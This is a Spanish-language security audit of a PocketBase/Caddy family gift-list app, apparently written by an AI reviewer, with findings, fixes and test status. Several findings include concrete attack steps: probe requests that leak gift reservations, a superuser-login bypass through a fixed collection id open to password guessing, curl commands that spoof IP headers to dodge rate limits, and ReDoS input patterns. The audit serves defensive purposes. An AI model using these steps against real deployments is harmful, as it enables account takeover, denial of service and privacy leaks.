Fecha: 2026-11-11 · Alcance: `1762850000_lazo.js`, `1762860000_plazas_hucha.js`, `lazo.pb.js`, `lib/lazo.cjs`, `src/core/hucha.ts`, `Hucha.tsx`, `List.tsx`, `src/api/demo.ts`, `src/api/pocketbase.ts`, `server/test/rules.test.mjs`, contra la spec `2026-11-11-plazas-hucha-design.md`.

**Método y límites.** Revisión estática, igual que la primera: **no he ejecutado PocketBase** (Smart App Control) ni las pruebas. V-1 se deduce solo del código. V-2 y V-4 dependen de semántica de PocketBase que conozco por su código fuente (difusión de tiempo real y filtros por relación) pero no he confirmado con una petición: cada uno lleva su prueba. No se ha tocado código.

### Estado de los hallazgos de la primera auditoría

| Id | Estado | Verificado en |
|---|---|---|
| R-1 | **Corregido** | `lazo.pb.js:18-27` (lista blanca de topics) y pruebas `rules.test.mjs:170-190` |
| R-2 | **Corregido por rediseño** | Enlace personal de 1 uso (`lazo.pb.js:124`); el general ya no da acceso, solo una solicitud (`:184-211`). Queda el riesgo declarado R1 de la spec. Ver V-5 |
| R-3 | **Pendiente (mitigado)** | `lists.user`, `claims.user`, `contributions.user` siguen sin cascada (`1762850000_lazo.js:58,102,118`). Ahora la plaza queda libre y volver exige enlace o aprobación; ver V-10 |
| R-4 | **Parcial** | Hay pruebas de tiempo real; siguen faltando `sort=claims_via_item.id` y el filtro con `%5F` en la URL |
| R-5 | **Corregido** | El hook de `claims` ya no existe; `gift` comprueba dueño y grupo y cuenta dentro de la transacción (`lazo.pb.js:308-335`) |
| R-6 | **Pendiente (aceptado)** | `index.html:8` sigue con `img-src https:` |
| G-1 | **Corregido** | `Caddyfile:14-15`; regla `*:auth` en `1762850000_lazo.js:218` |
| G-2 | **Corregido** | `1762850000_lazo.js:212-213` |
| G-3 | **Corregido** | `invite-revoke` (`lazo.pb.js:609-622`), `plaza-release` (`:254-280`); `SECURITY.md:60` ya dice 190 bits |
| G-4 | **Parcial** | `logout-all` (`:625-634`) y límite de `device-code` hechos. Los códigos caducados siguen sin borrarse (no hay `cronAdd`) |
| G-5 | **Corregido** | `lazo.pb.js:535-539` y contador `drawRounds` (`:556-557`) |
| G-6 | **Corregido** | `.gitignore` (`server/data/`) y `.dockerignore` |
| G-7 | **Corregido** | Todas las reglas empiezan por `AUTH`; `lists.deleteRule` exige grupo (`1762860000_plazas_hucha.js:41`) |
| G-8 | **Corregido** | `server/unfurl/fetch.mjs:89-90` |
| G-9 | **Corregido** | `server/unfurl/guard.mjs` (los cinco rangos) |
| G-10 | **Parcial** | Transacción, superusuario, `name` ≤ 40 y plaza del creador en `onRecordCreate`: hechos. Las plazas libres de «¿Quiénes sois?» se crean tras `e.next()` (`lazo.pb.js:40-50`): fuera de transacción; si una falla, el grupo queda a medias |
| G-11 | **Parcial** | `authAlert` apagado. Siguen: la baja falla con error genérico si hay reservas, y el dueño puede darse de baja y dejar el grupo sin admin (no hay hook en `users`) |
| G-12 | **Pendiente** | Sin `cap_drop`, PocketBase sin `read_only`, zip sin `sha256sum`, `node:24-alpine`/`alpine:3.22` y acciones de GitHub por etiqueta |
| G-13 | **Parcial** | Cabecera CSP con `frame-ancestors` y COOP en `Caddyfile:9-10`. `ItemSheet.tsx:152` sigue pintando `href={item.url}` sin comprobar `^https?://` |
| G-14 | **Corregido** | `package.json:11` (`prepare`) y patrón ampliado en `.githooks/pre-commit` |
| G-15 | **Corregido** | Lotes activados (`1762850000_lazo.js:215-216`) y troceo de 50 (`pocketbase.ts:91`). Falta la prueba PB-14 |
| G-16 | **Parcial** | `logIP = false`. El resto era documentación |

### Resumen de la revisión

| Severidad | N.º | Hallazgos |
|---|---|---|
| Crítico | 0 | — |
| Alto | 2 | V-1, V-2 |
| Medio | 5 | V-3, V-4, V-5, V-6, V-7 |
| Bajo | 8 | V-8 … V-15 |

**Veredicto.** Las reglas de `claims`, `contributions`, `budgets`, `payments` y la de sorpresas (`VIS`) están bien escritas y cumplen la spec; `gift` es transaccional y responde 403/404 antes de leer estado; las cuentas de `core/hucha.ts` no dependen de la plaza de quien mira. LA REGLA se rompe en un solo punto, por dos canales: **quitar un regalo propio delata si estaba cogido** (V-1 y V-2). Lo demás son bordes del modelo de plazas y pruebas que faltan.

### Lo que he comprobado y está bien

- **Reglas de la migración.** `new Field({...})` existe en JSVM y crea el campo por `type`. `managers:length = 0` es válido en un campo múltiple y `birthYear = 0` pasa (el mínimo 2000 solo se aplica a valores no nulos). `group.treasurer.user` encadena dos relaciones simples y resuelve bien; con roles sin fijar da vacío y, como `from`/`to` son obligatorios, no casa nunca. El índice parcial `WHERE user != ''` es correcto (las listas de niños y las plazas libres quedan fuera). La migración de datos (`buyMode`, `kind`, `paidBy`, `paidCents`) es correcta e idempotente.
- **I1 se mantiene.** No hay relación directa desde algo visible para X hacia algo oculto para X (sorpresas y retirados incluidos): solo se llega por `_via_`, cortado en URL y en tiempo real.
- **`gift`.** Orden correcto: regalo → `list.user = yo` (404 si es sorpresa, 403 si no) → grupo → transacción. `runInTransaction` usa la conexión de escritura única, así que «contar y luego insertar» es atómico: 20 reservas simultáneas dan 1 fila. `paidBy` se valida contra pagadores (nunca el ocupante). Los errores lanzados dentro de la transacción conservan su código (goja relanza la misma excepción).
- **API de JSVM.** `e.noContent(204)`, `e.request.pathValue('group')`, `findRecordsByFilter(col, filtro, sort, limit, offset, params)` con límite 1 o 0, `set('members-', id)`, `recordAuthResponse(e, user, 'invite', meta)` y `e.subscriptions`: todos bien usados. Dentro de las transacciones se usa siempre `tx`, nunca `$app`.
- **Entrada.** Token revalidado dentro de la transacción; mismo mensaje para token falso, caducado, revocado, agotado y plaza personal ya ocupada (también en `invite-info`). Un pendiente no es miembro. `reclamar` comprueba plaza libre y no-miembro, y el índice único cierra la carrera.
- **`plaza-release`, `hucha-roles`, `reveal`, `received`.** Mismas respuestas para todos los rechazos; `received` comprueba grupo y `revealedAt` antes de leer listas y no devuelve precios, `paidBy`, reservas ni aportaciones.
- **Cliente.** `ledger` solo se llama en `List.tsx:137` con `d.canSee`, y la línea «Hucha de … sale a … por persona» (`:157-162`) está en la rama `!mine`. `due`, `myShares` y `forecast` excluyen la plaza propia de forma explícita además de no recibir sus filas. `collectTable` del tesorero excluye su plaza (`treasurerList`) y la del suplente solo usa L_T. «Mis compras» sale de `claims`/`contributions` filtradas por regla. `Group.tsx:147-148` pone `freeCount` y presupuesto a nulo si `!canSee`. Ningún número que vea X depende de su plaza.

### V-1 · Alto · `gift` distingue un regalo propio «retirado» de uno borrado (403 frente a 404)

`server/pb/pb_hooks/lazo.pb.js:308-311` · igual en `src/api/demo.ts:546-547`

Al quitar un regalo propio, si tenía reservas, compras o aportaciones se marca `removed`; si no, se borra. La respuesta al borrado es la misma (204), pero después `gift` lo delata: para el dueño, un regalo `removed` sigue existiendo y devuelve **403** «No puedes reservar regalos de tu propia lista.»; uno borrado de verdad devuelve **404**.

**Ataque.** Marta quiere saber si ya le han cogido la batidora (id `A`, lo ve en su lista):

```
DELETE /api/collections/items/records/A                      → 204 (siempre)
POST   /api/lazo/gift {"action":"reserve","item":"A"}        → 403 = estaba cogida · 404 = estaba libre
```

Luego vuelve a apuntarla. Un bit por regalo, con `curl` o desde la consola del navegador. Rompe LA REGLA por deducción (D6 de la spec).

**Corrección.** Para su dueño, un retirado no existe:

```js
if (list.getString('user') === me) {
  if (item.getBool('secret') || item.getBool('removed')) throw notFound();
  throw new ForbiddenError('No puedes reservar regalos de tu propia lista.');
}
```

y en `demo.ts:546`: `if (!item || !list || ((item.secret || item.removed) && list.user === this.viewer)) throw …`.

**Prueba (PB-10).** Como dueño: borrar un regalo libre y otro reservado; `gift` sobre ambos ids y sobre uno inventado debe dar el mismo código y cuerpo; lo mismo con `GET`, `PATCH` y `DELETE`.

### V-2 · Alto · El borrado real emite un evento de tiempo real al dueño; el «retirado» no

`server/pb/pb_hooks/lazo.pb.js:80-91`

PocketBase emite `delete` a quien podía ver el registro antes de borrarlo. En la rama «retirado» se guarda `removed = true`: es un `update` que se evalúa con el estado nuevo, y el dueño ya no cumple `VIS`, así que no recibe nada.

**Ataque.** X se suscribe a `items/*` (el topic pasa la lista blanca) y borra su regalo. Llega `delete` → nadie lo había cogido. Silencio → estaba cogido. Mismo bit que V-1 por otro canal; corregir uno sin el otro no sirve.

**Corrección.** Ocultar siempre antes de decidir, para que el dueño nunca reciba evento:

```js
const touched = …;                       // igual que hoy
e.record.set('removed', true);           // el dueño deja de cumplir la viewRule
$app.save(e.record);                     // los demás reciben «update»; el dueño, nada
if (!touched) return e.next();           // el «delete» posterior tampoco le llega: la comprobación de acceso ve removed = true
return e.noContent(204);
```

**Prueba.** Con la función `realtime` que ya existe: dueño suscrito a `items/*`, borra un regalo libre y otro reservado; `events` debe ser igual (vacío) en los dos casos. **Ejecutarla antes de corregir**: confirma o descarta el hallazgo.

### V-3 · Medio · La entrega, una vez abierta, sigue revelando las compras posteriores

`server/pb/pb_hooks/lazo.pb.js:475` · `src/api/demo.ts:468`

`received` calcula al vuelo sobre todo lo `bought`. Si nadie pulsa `close`, la entrega queda abierta para siempre.

**Escenario.** Se abre el 24 de diciembre. El 3 de enero Papá compra el regalo de Reyes de Marta. Marta abre «Ver qué me regalaron» y lo ve con título y «de parte de Papá». Tras la primera apertura, X tiene un canal permanente sobre las compras de su plaza.

**Corrección.** Revelar solo lo comprado antes de abrir:

```js
$app.findRecordsByFilter('claims', 'item.list = {:l} && status = "bought" && boughtAt <= {:t}', '', 0, 0, { l: plaza.id, t: group.getInt('revealedAt') })
```

(`boughtAt = 0` en las filas migradas: entran). Para enseñar lo nuevo hay que cerrar y volver a abrir con dos llaves. En la demo: `&& (c.boughtAt ?? 0) <= g.revealedAt`.

### V-4 · Medio · Quien no es miembro conserva un sondeo a ciegas del grupo a través de `joinRequests` y `payments`

`server/pb/pb_migrations/1762860000_plazas_hucha.js:84-88, 111` · `1762850000_lazo.js:127, 166`

PocketBase no aplica la regla de la colección de destino cuando un filtro atraviesa una relación **directa**. `joinRequests` es la primera colección que un **no miembro** puede listar y tiene relaciones directas a `groups` y `lists`.

**Ataque.** Alguien con el enlace general pide entrar (queda pendiente, o es rechazado: su fila sigue siendo suya) y pregunta sí/no:

```
GET /api/collections/joinRequests/records?filter=group.members.name ?~ "Sam"
GET /api/collections/joinRequests/records?filter=group.treasurer.user.name ~ "Alb" || group.revealedAt > 0
```

Si la respuesta trae su solicitud, es cierto. Saca nombres de los miembros, quién es tesorero, modo, estado de la entrega y qué plazas están ocupadas. **No** llega a regalos, reservas, presupuestos ni pagos ajenos (solo se alcanzan por `_via_`). La spec dice «no lee nada». Lo mismo le queda a una cuenta **expulsada** a través de sus `payments` (`group.…`) y de su `assignments` (`draw.group.…`); además puede seguir **borrando** sus pagos y aportaciones y descuadrar la hucha desde fuera.

**Corrección.**

```js
// joinRequests: listar (y por tanto filtrar) solo los admins; el solicitante consulta la suya por id (ya lo hace: requestStatus → getOne)
listRule: `${AUTH} && status = "pending" && group.admins ?= ${ME}`,
viewRule: `${AUTH} && (user = ${ME} || (status = "pending" && group.admins ?= ${ME}))`,
// payments: las tres reglas de lectura y borrado
`${AUTH} && group.members ?= ${ME} && (from = ${ME} || to = ${ME})`
// contributions.deleteRule
`${SEE_ITEM} && user = ${ME}`
// assignments list/view
`${AUTH} && giver = ${ME} && draw.group.members ?= ${ME}`
```

**Prueba.** Pendiente: `joinRequests?filter=group.name != ""` → 0 filas. Expulsado: `payments` → 0 filas y `DELETE` → 404.

### V-5 · Medio · Volver con otra plaza: ve su plaza antigua y el traspaso mezcla historiales

`server/pb/pb_hooks/lib/lazo.cjs:35-64` · `src/api/demo.ts:515-536`

Nada impide que la cuenta P, liberada de «Papá» (`prevUser = P`), entre después en **otra** plaza del mismo grupo. Hace falta enlace personal o aprobación, así que cae dentro del riesgo R1 de la spec, pero aquí el admin puede actuar de buena fe («me he liado, acéptame como Tío Paco») y las consecuencias van más allá de R1:

1. P es miembro y no ocupa «Papá», que está libre: ve reservas, compras, sorpresas y presupuesto de su plaza de siempre.
2. Si P era el tesorero y entra en la plaza del suplente, hereda los pagos `sub = true`: las cuentas de sus propios regalos.
3. Cuando otra cuenta reclame «Papá», el traspaso (`:50-63`) le pasa **todo** lo que P tenga en el grupo, también lo que hizo como «Tío Paco»: quedan reservas de Papá sobre regalos de Papá, visibles para todos.

**Corrección.** Una cuenta solo puede volver a su plaza. En `reclamar`, tras la comprobación de `members`:

```js
if (tx.findRecordsByFilter('lists', 'group = {:g} && prevUser = {:u} && id != {:l}', '', 1, 0, { g: group.id, u: userId, l: plaza.id }).length)
  throw new BadRequestError('Tu sitio en este grupo es otro. Pide tu enlace a quien organiza.');
```

Mismo control en `DemoApi.claimPlaza`.

### V-6 · Medio (funcional) · No se pueden crear listas de niño con el servidor real

`src/api/pocketbase.ts:70` frente a `1762860000_plazas_hucha.js:38`

`addChildList` no envía `kind`, y la `createRule` exige `kind = "child"` o `kind = "person"`: PocketBase responde 400. La demo sí funciona, por eso no se ve. **Corrección:** `create({ group: groupId, name, birthYear, kind: 'child', managers: [this.uid()] })` y una prueba que cree una lista de niño.

### V-7 · Medio · Faltan los casos críticos de §9.3; dos de los que hay son vacíos

`server/test/rules.test.mjs`

| Caso | Estado | Qué falta |
|---|---|---|
| PB-1 | Parcial | `sort`, `fields`, filtro con `%5F` en URL; tiempo real de **compra y borrado** y de `contributions`, `budgets` y sorpresas; regalos retirados |
| **PB-2** | **Falta** | No interferencia byte a byte ∀X. Es la prueba que habría cazado V-1 y V-2 |
| **PB-3** | **Vacío** | `:236` comprueba 0 `claims` en la plaza «Tía Loli», que no tiene regalos, reservas ni presupuesto. Hay que sembrarla (presupuesto, sorpresa, reserva, compra de hucha) **antes** de reclamarla y repetir PB-1 con la cuenta nueva |
| PB-4 | Falta | Segundo uso del enlace personal; regenerar revoca el anterior; no se genera para plaza ocupada |
| PB-5 | Parcial | `users` y `joinRequests` del pendiente; camino de rechazo |
| PB-6 | Parcial | (b) dos solicitudes a la misma plaza; (c) dos `join` personales simultáneos; (d) `invite` y `plaza-release` por no admin; (e) `kind`, `via`, `claimedAt` |
| PB-7 | Falta | `plaza-release` del dueño por otro admin; `PATCH groups` con `treasurer`, `deputy`, `revealedAt`, `members` |
| PB-8 | Parcial | Solo libre y reservado. Faltan comprado, con aportaciones, **retirado** y la vía `claim` |
| **PB-9** | **Falta** | Tabla de transiciones por modo y 20 `reserve` concurrentes → 1 fila |
| **PB-10** | **Falta** | `DELETE items` 204 con y sin reservas, queda `removed`, 404 después (V-1, V-2) |
| PB-11 | Parcial | Solo `>= 400`; comparar cuerpo con y sin presupuesto previo |
| PB-12 | Parcial | Un tercero no borra; `view` por id; tiempo real del tesorero |
| PB-13 | Hecha | Agregados de `core/hucha` sobre lo que el servidor entrega a X, invariantes a lo de X |
| **PB-14** | **Falta** | `/api/batch` con `expand`/`filter` que lleven `_via_` (el lote está activado) |
| PB-15 | Parcial y frágil | `:258` traga el fallo de la compra con `.catch(() => null)`: si falla, `received` es `[]` y la prueba pasa. Afirmar `r.json.length === 1`, `from`, que lo reservado no sale, `ask` por no admin → 403 |
| PB-16 | Parcial | Plazas iguales, libres, de otro grupo; no admin |
| PB-17 | Falta | `invite-info` no se prueba |

Orden: PB-10, PB-2, PB-3, PB-9, PB-14.

### Bajos

**V-8 · `gift` usa `list` e `item` leídos fuera de la transacción** (`lazo.pb.js:303-313`, usados en `:322, 333, 335`). Entre la lectura de `list` y la de `group0` puede confirmarse un `join` de la misma cuenta sobre esa plaza: pasaría las dos comprobaciones y reservaría en su propia plaza. No es explotable hoy (habría que conocer el id de un regalo sin haber sido miembro), pero cuesta dos líneas: releer `lists` e `items` con `tx` y repetir `if (list.getString('user') === me)` dentro. La misma ventana existe en el hook de `contributions` (`:69-77`, comprobar y crear sin transacción) y en el borrado de regalos (`:86-87`).

**V-9 · El límite de `received` no se aplica** (`1762860000_plazas_hucha.js:149`). Las etiquetas de límite casan por igualdad, o por prefijo solo si acaban en `/`. `GET /api/lazo/received` no casa con `/api/lazo/received/<id>`. Corrección: `'GET /api/lazo/received/'`.

**V-10 · Baja de cuenta con plaza** (R-3, G-11). Al borrarse la cuenta, la plaza queda con `user = ""` pero con `via` y `claimedAt` antiguos y sin `prevUser`; si era el dueño, el grupo queda sin admin. Corrección: `onRecordDeleteRequest` en `users` que responda 400 «Pide a quien organiza que libere tu sitio antes de borrar tu cuenta.» si ocupa alguna plaza, y que impida la baja del dueño mientras exista el grupo.

**V-11 · Los roles de la hucha sí se pueden cambiar** (D14). Un admin libera la plaza del tesorero, la borra (si no tiene compras) y PocketBase vacía `groups.treasurer`: `hucha-roles` vuelve a aceptar. No filtra nada, pero contradice «se fijan una vez». Corrección: en el hook de borrado de `lists` (`:94-97`), 400 si la plaza es `treasurer` o `deputy` de su grupo.

**V-12 · Campos menos estrictos que la spec.** `groups.buyMode` no es `required` (`:22`): un admin puede dejarlo vacío con `PATCH`; `gift` lo trata como `individual` y el hook de aportaciones como «no hucha». Marcarlo `required` tras rellenar los datos. `drawRounds` no se reinicia al crear el grupo (`lazo.pb.js:32-38`): fijarlo a 0 con el resto.

**V-13 · Bordes de plazas.** (a) `plaza-release` no limpia `approvedBy` (`:267-270`). (b) El traspaso no mueve `items.createdBy`: las sorpresas de la cuenta anterior quedan sin nadie que pueda editarlas o quitarlas. (c) El índice único de `joinRequests (group, user)` y la comprobación de `:201` impiden volver a pedir entrada a quien fue rechazado o liberado tras entrar por el enlace general: borrar la solicitud resuelta al rechazar y al liberar. (d) `join-decide` no vuelve a mirar si el nombre nuevo ya existe (`:236-240`), y `lists.createRule` no impide dos plazas con el mismo nombre (la demo sí, `demo.ts:124`). (e) Compra directa y aportación sobre un regalo `removed` no se rechazan (`:367-381`, `:69-77`); `reserve` sí.

**V-14 · Diferencias con la spec sin impacto de seguridad.** No existe la acción `edit` (precio / quién pagó) de §3.2: hoy es `unbuy` + `buy`. `gift` devuelve `{ok: true}` en vez de la fila. `invite-info` devuelve además `group.id`.

**V-15 · Discrepancias de la demo con el servidor** (`src/api/demo.ts`).

| Dónde | Demo | Servidor |
|---|---|---|
| `giftTarget` `:546-547` | Retirado propio → «No puedes reservar…» | Igual (V-1): corregir en los dos |
| `saveItem` `:146-150` | Editar una sorpresa o un retirado de la propia plaza → «Solo quien lleva esta lista…» (distinto de «ya no existe») | 404 idéntico a inexistente |
| `deleteItem` `:172-189` | Borrar otra vez un retirado propio → éxito | 404 |
| `purchases` `:509-510` | Sin filtro de visibilidad | La regla quita lo de la propia plaza. Añadir `canSeeStatus(this.viewer, list)` |
| `inviteInfo` `:314-325` | Enlace personal de una plaza ya ocupada → devuelve la plaza | Mensaje genérico |
| `addPlaza` `:124` | Rechaza nombres repetidos | Los admite (V-13 d) |
| `claimPlaza` `:515` | No comprueba plaza libre ni miembro (lo hacen quienes la llaman) | `reclamar` lo comprueba dentro |
| `received` `:461-475` | Igual que el servidor | V-3 en los dos |
| `join` | Siempre cuenta nueva; sin caducidad ni «una solicitud por cuenta» | Documentado en el comentario; aceptable |

Las reglas de `gift` (modos, unidades, aportaciones, `paidBy`, `unbuy`), `contribute`, `setBudget`, `addPayment`, `hucha`, `reveal`, `releasePlaza` y `setHuchaRoles` coinciden con el servidor.

### Orden de trabajo propuesto (v0.3)

1. V-1 y V-2 con su prueba (PB-10) y PB-2.
2. V-6 (una línea, funcionalidad rota en producción).
3. V-4, V-5, V-3.
4. PB-3, PB-9, PB-14 y arreglar PB-15.
5. V-8 … V-15 y los pendientes de la primera auditoría (G-12, G-11/V-10, G-4, G-13, R-4).

## Estado tras ejecutar PocketBase real (2026-11-11)

- **Hallazgo grave al ejecutar:** en PocketBase 0.40 `members ?= X` sobre una relación múltiple **no** casa; hay que escribir `members.id ?= X`. Con la sintaxis anterior nadie veía nada (fallo seguro, pero la app no funcionaba). Corregido en todas las reglas y filtros (`members`, `admins`, `managers`).
- **Pagos:** la `createRule` con `group.treasurer.user` no se evaluaba; la validación de quién lleva cada caja pasa a `onRecordCreateRequest('payments')`.
- **Corregidos:** V-1 (retirado ≡ inexistente en `gift`), V-2 (siempre «retirado» antes de borrar), V-3 (la entrega no revela compras posteriores), V-4 (solicitudes y pagos no se pueden listar ni filtrar desde fuera), V-5 (una cuenta liberada no vuelve con otra plaza) y V-6 (listas de niño con `kind`).
- `server/test/rules.test.mjs`: **17/17 en verde contra PocketBase 0.40.6** (cada miembro, tiempo real, cortafuegos, PB-5/6/8/10/12/15 y V-4).
- Pendientes en ese momento: V-8 a V-15 (bajos) y las pruebas PB-2, PB-9, PB-13, PB-14 y PB-17.

## Estado tras los hallazgos bajos (2026-11-11)

- **Corregidos:** V-8 (`gift`, aportaciones y borrado de regalos releen y comprueban dentro de la transacción), V-9 (migración `1762870000_endurecer.js`: etiqueta `GET /api/lazo/received/`), V-10 (no se puede borrar la cuenta con una plaza ocupada ni siendo dueño), V-11 (la plaza del tesorero o del suplente no se borra), V-12 (`buyMode` obligatorio; `drawRounds` a 0 al crear), V-13 a–e (liberar limpia `approvedBy` y las solicitudes; el traspaso mueve `items.createdBy`; rechazar borra la solicitud y el cliente lo lee como «rechazada»; sin nombres repetidos al crear plazas ni al aceptar; compra y aportación sobre un retirado → 400) y V-15 (paridad de la demo: `saveItem`, `deleteItem`, `purchases`, `inviteInfo`, `releasePlaza`, `decideJoin` y traspaso de sorpresas).
- **V-14:** se mantiene como diferencia documentada con la spec (sin impacto de seguridad).
- `server/test/rules.test.mjs`: **22/22 en verde contra PocketBase 0.40.6**, con PB-2 (no interferencia byte a byte para Marta), PB-3 (plaza con historial antes de reclamarla), PB-9 (20 reservas simultáneas → 1 fila), PB-14 (lotes con `expand` y `_via_`), PB-17 (enlace usado ≡ falso) y una prueba de V-9/V-10/V-11/V-13.
- PB-13 (2026-11-11): las cuentas de la hucha (`core/hucha`) de cada miembro, calculadas con lo que el servidor le entrega, coinciden con las esperadas y no cambian por lo que pasa en su plaza. **23/23 en verde.** No queda ninguna prueba pendiente.

## Auditoría v0.5 (Fable 5.2)

Fecha: 2026-11-12 · Alcance: `git diff 8a469ee..HEAD` (avisos, sorteo, importación y metadatos, homelab, `flujo.test.mjs`).

**Método y límites.** Revisión estática del diff y dos comprobaciones ejecutadas: V-16 contra un PocketBase 0.40.6 real (instancia desechable en WSL) y V-18 midiendo `server/unfurl/meta.mjs` con Node 24. **No he ejecutado** Caddy, Docker, cloudflared ni las suites de pruebas: lo que digo de Caddy y de Docker sale de leer la configuración y de su comportamiento documentado. `server/unfurl/fetch.mjs` y `guard.mjs` no cambian en la v0.5: el anti-SSRF está como en la revisión anterior. No se ha tocado código.

### Resumen

| Severidad | N.º | Hallazgos |
|---|---|---|
| Crítico | 0 | — |
| Alto | 1 | V-16 |
| Medio | 3 | V-17, V-18, V-19 |
| Bajo | 6 | V-20 … V-25 |

### Lo que he comprobado y está bien

- **Avisos, la regla.** `buildFacts` descarta las plazas propias antes de calcular nada (`mine`, `foreign`) y solo guarda regalos ajenos que no son sorpresa, ni retirados, ni apuntados por quien mira. `due` solo suma plazas ajenas (`r.user !== j`) y pagos en los que quien mira es parte; para el tesorero es 0. La cuenta de «ha añadido N regalos» sale solo de listas ajenas, y la regla de `items` impide que alguien apunte algo no secreto en la plaza de otro adulto. Ningún aviso, ni su ausencia, ni el contador, ni el orden (el de `api.groups()`) depende de la plaza propia. Los textos se pintan con React, sin HTML.
- **Sorteo.** `navigator.share` y el portapapeles solo se llaman desde el `onClick` de «Enviármelo» / «Copiar». El mensaje lleva el nombre del grupo, la persona que te ha tocado y el enlace a su lista: nada de otras asignaciones, exclusiones ni presupuesto. Tapado, el contenido queda `inert` y `aria-hidden`.
- **Importación.** SheetJS 0.20.3 desde su CDN con `integrity` en el lock (sin las CVE de 0.18.5). Nada evalúa fórmulas y las celdas se pintan como texto. `safeUrl` solo deja `http(s)`. **No existe exportación**, así que hoy no hay inyección de fórmulas; si se añade, anteponer `'` a las celdas que empiecen por `=`, `+`, `-`, `@`, tabulador o retorno.
- **JSON-LD.** `JSON.parse` dentro de `try`, recorrido con tope de profundidad (6 y 3) y lineal en el tamaño. Imagen y `og:url` solo `https:`.
- **Homelab.** Sin secretos en el diff ni en el historial (`.env.example` solo trae marcadores). `umask 077` en las copias, `sqlite3 .backup` con `integrity_check`, contenedor de copias sin red, PocketBase solo en `127.0.0.1:8090`. Caddy limpia `//` y `%5F` antes de comparar rutas y `path` no distingue mayúsculas, así que `/api/collections/_SUPERUSERS/…` (que PocketBase sí acepta) queda bloqueado.

### V-16 · Alto · El login de superusuario sigue en Internet: Caddy bloquea por nombre y PocketBase acepta el id

`server/Caddyfile:26-27` · `docs/HOMELAB.md:100` · `SECURITY.md:62`

`@admin` tapa `/api/collections/_*`, pero PocketBase resuelve la colección **por nombre o por id**, y el id de `_superusers` es fijo en todas las instalaciones: `pbc_3142635823`. Esa ruta no empieza por `_` y `@adminCollections` solo casa rutas sin subruta.

**Comprobado** en PocketBase 0.40.6: `POST /api/collections/pbc_3142635823/auth-with-password` responde 200 con la clave buena y 400 con la mala.

**Escenario.** Cualquiera en Internet (o X, que quiere ver su lista) lanza un diccionario contra `https://tu-dominio/api/collections/pbc_3142635823/auth-with-password`. Solo le frena `*:auth` (2 cada 3 s por IP), que con V-17 o con varias IP no frena nada. Con el token de superusuario se lee todo: la regla entera, las asignaciones del sorteo y los datos de los niños. La documentación afirma que esa API «no está publicada».

**Arreglo.** Lista blanca en vez de lista negra. En `server/Caddyfile`, sustituir la línea de `@adminCollections` por:

```
	@adminCollections {
		path /api/collections /api/collections/*
		not path_regexp ^/api/collections/(users|groups|lists|items|claims|contributions|budgets|payments|draws|assignments|joinRequests)/(records(/[A-Za-z0-9_]+)?|auth-refresh)$
	}
```

Son las únicas rutas de colección que usa `src/api/pocketbase.ts`. Validar con `caddy validate` (no lo he ejecutado). Segunda capa opcional en `lazo.pb.js`: rechazar el login de `_superusers` si la petición trae `X-Forwarded-For` (Caddy siempre lo pone; el túnel SSH a `127.0.0.1:8090`, no).

**Prueba.** (1) `server/test/caddyfile.test.mjs`: leer la expresión del Caddyfile y afirmar que **no** casa `/api/collections/pbc_3142635823/auth-with-password`, `/api/collections/_superusers/records`, `/api/collections/users/impersonate/x`, `/api/collections/users/truncate` ni `/api/collections/users`, y que **sí** casa `items/records`, `items/records/abc123` y `users/auth-refresh`. (2) En `docs/HOMELAB.md` §7: `curl -s -o /dev/null -w '%{http_code}\n' -X POST https://tu-dominio/api/collections/pbc_3142635823/auth-with-password` → 404.

### V-17 · Medio · Caddy se fía de las cabeceras de IP de cualquier red privada, y el túnel comparte red con PocketBase

`server/Caddyfile:5-6` · `server/docker-compose.yml:20, 51, 101`

`trusted_proxies static private_ranges` no confía solo en cloudflared: confía en todo el que llegue desde una IP privada. Eso incluye la wifi de casa (`192.168.x`) y la pasarela de Docker, que es lo que ve Caddy cuando la conexión entra por `docker-proxy` (IPv6 sin NAT de Docker, Docker sin root). Además `cloudflared` y `pocketbase` comparten la red `publica`.

**Escenario.** X, desde la wifi de casa, manda `CF-Connecting-IP: 203.0.113.N` con un N distinto en cada petición: ningún límite por IP le cuenta (`*:auth`, `device-claim`, `join`, `/api/`). O pone la IP del móvil de Marta y le agota `POST /api/lazo/join` (10 por minuto): Marta no puede entrar. Aparte: quien controle el panel de Cloudflare puede apuntar el túnel a `pocketbase:8090` y saltarse todos los bloqueos de Caddy.

**Arreglo.** Confiar en una sola IP, la de cloudflared, en una red propia.

`server/docker-compose.yml`:

```yaml
  caddy:
    networks: [publica, tunel]
  cloudflared:
    networks:
      tunel: { ipv4_address: 172.31.253.3 }
networks:
  tunel:
    ipam: { config: [{ subnet: 172.31.253.0/29 }] }
```

`server/Caddyfile`:

```
		trusted_proxies static 172.31.253.3/32
		client_ip_headers CF-Connecting-IP
```

Así PocketBase deja de ser alcanzable desde el túnel.

**Prueba.** En `docs/HOMELAB.md` §7, desde la LAN: doce `curl -X POST -H "CF-Connecting-IP: 203.0.113.$i" -d '{"token":"x"}' https://tu-dominio/api/lazo/join` seguidos; las dos últimas respuestas deben ser 429. Hoy son las doce 400.

### V-18 · Medio · ReDoS: una página hostil bloquea `unfurl` durante minutos

`src/core/meta.ts:34, 41, 155, 175` (compilado a `server/unfurl/meta.mjs`) · `server/unfurl/index.mjs:22-25`

Cuatro expresiones son cuadráticas cuando la etiqueta no se cierra: `<meta\b[^>]*>`, la de microdatos (`[^>]*\bitemprop…[^>]*>`), `<title[^>]*>([\s\S]*?)</title>` y la de `<script … ld+json>…</script>`. El análisis es síncrono en el único hilo de `unfurl`, y el tope de 6 s solo cubre la descarga.

**Medido** (Node 24.19, `'<meta '`, `'<a '` y `'<title>'` repetidos):

| Tamaño | `<meta` | microdatos | `<title>` |
|---|---|---|---|
| 50 KB | 0,5 s | 0,65 s | 0,1 s |
| 100 KB | 2,0 s | 2,7 s | 0,5 s |
| 200 KB | 9,6 s | 10,9 s | 1,8 s |

Con los 1,5 MB que deja pasar `fetch.mjs` salen unos 9 y 10 minutos (extrapolado).

**Escenario.** Un miembro pega (o le mandan «mira este regalo») un enlace a una página de 1,5 MB de `<meta ` sin cerrar. PocketBase se rinde a los 10 s, pero `unfurl` sigue con un núcleo de la Raspberry al 100 % y no atiende a nadie más. Con 20 enlaces por minuto, «añadir por enlace» queda caído para toda la familia. No filtra datos.

**Arreglo** en `src/core/meta.ts`: acotar las etiquetas y buscar el cierre con `indexOf`.

```ts
page.match(/<meta\b[^>]{0,1000}>/gi)
page.match(/<title[^>]{0,200}>([^<]{0,1000})/i)?.[1]
